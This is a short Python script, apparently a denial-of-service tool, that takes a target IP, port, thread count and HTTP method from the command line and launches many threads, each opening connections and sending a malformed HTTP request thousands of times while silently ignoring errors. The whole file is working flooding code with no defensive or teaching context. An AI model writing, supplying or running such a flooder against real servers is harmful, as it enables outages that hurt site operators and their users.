import socket,threading,sys,random,string

def http_flood(add,method,count):
    for _ in range(count):
        try:
            s,p = socket.create_connection((add)),f'{method} /{"".join(random.choice(string.ascii_letters+string.digits+string.punctuation) for _ in range(1))} HTTP/1.1\nHost: {add[0]}\n\n\r\r'.encode(); [s.send(p) for _ in range(2500)]
        except:pass

[threading.Thread(target=http_flood,args=((sys.argv[1],int(sys.argv[2])),sys.argv[5],int(sys.argv[4]))).start() for _ in range(int(sys.argv[3])*5)] # <IP> <PORT> <THREAD> <TIME> <METHOD_HTTP>